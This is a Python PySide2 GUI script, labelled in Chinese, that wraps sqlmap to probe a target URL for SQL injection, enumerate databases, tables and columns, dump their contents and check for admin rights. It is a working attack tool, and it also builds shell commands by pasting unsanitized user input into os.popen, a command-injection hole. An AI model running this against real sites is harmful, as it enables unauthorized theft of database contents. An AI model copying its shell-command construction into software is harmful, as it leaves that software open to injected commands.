#!/bin/python3
import os
import re

from PySide2 import QtCore
from PySide2 import QtGui
from PySide2.QtGui import QImageReader
from PySide2.QtUiTools import QUiLoader
from PySide2.QtWidgets import QApplication

gongnen = ['查询是否存在注入点',
           '检测站点包含哪些数据库',
           '获取网页的数据库名',
           '获取指定数据库中的表名',
           '获取数据库表中的字段',
           '获取字段的数据内容',
           '检测当前用户且判断是否为管理员用户'

           ]


class sql:

    def __init__(self):
        self.ui = QUiLoader().load('ui/untitled.ui')
        self.ui.comboBox.addItems(gongnen)
        self.ui.button1.clicked.connect(self.handleCalc)
        pixmap = QtGui.QPixmap('img/1.png')
        self.ui.label.setPixmap(pixmap)
        self.ui.label.show()

    def handleCalc(self):
        url = sql.ui.text1.toPlainText()
        level = int(sql.ui.text5.toPlainText())
        threads = int(sql.ui.text6.toPlainText())
        database = sql.ui.text2.toPlainText()
        table = sql.ui.text3.toPlainText()
        colu = sql.ui.text4.toPlainText()
        method = sql.ui.comboBox.currentText()
        b = ""
        a = ""
        if method == gongnen[0]:
            b = os.popen(
                "sqlmap -u \"{}\" --level {} --batch --threads {}".format(url, level, threads)).read()


        if method == gongnen[1]:
            a = os.popen("sqlmap -u \"{}\" --dbs --level {} --batch --threads {}".format(url, level, threads))
            a = re.findall("\[\*] .*", a.read())
            a = a[1:-1]

        if method == gongnen[2]:
            a = os.popen(
                "sqlmap -u \"{}\" --current-db --level {} --batch --threads {}".format(url, level, threads))
            a = re.findall("current (.*)", a.read())
            a = [a[1]]

        if method == gongnen[3]:
            a = os.popen(
                "sqlmap -u \"{}\" --tables -D \"{}\" --level {} --batch --threads {}".format(url, database, level,
                                                                                             threads))
            a = re.findall("Database: .*\+", a.read(), flags=re.S)

        if method == gongnen[4]:
            a = os.popen(
                "sqlmap -u \"{}\" --columns -T \"{}\" -D \"{}\" --level {} --batch --threads {}".format(url, table,
                                                                                                        database,
                                                                                                        level,
                                                                                                        threads))
            a = re.findall("Database: .*\+", a.read(), flags=re.S)

        if method == gongnen[5]:
            a = os.popen(
                "sqlmap -u \"{}\" --dump -C \"{}\" -T \"{}\" -D \"{}\" --level {} --batch --threads {}".format(url,
                                                                                                               colu,
                                                                                                               table,
                                                                                                               database,
                                                                                                               level,
                                                                                                               threads))
            a = re.findall("Database: .*\+", a.read(), flags=re.S)

        if method == gongnen[6]:
            a = os.popen(
                "sqlmap -u \"{}\" --current-user --is-dba --level {} --batch --threads {}".format(url, level, threads))
            a = re.findall("current user: .*", a.read())

        for i in a:
            b += i
            b += "\n"
        sql.ui.textx1.setPlainText(b)
        # print(b)


QImageReader.supportedImageFormats()
app = QApplication([])
app.addLibraryPath(os.path.join(os.path.dirname(QtCore.__file__), "plugins"))
sql = sql()

sql.ui.show()
app.exec_()
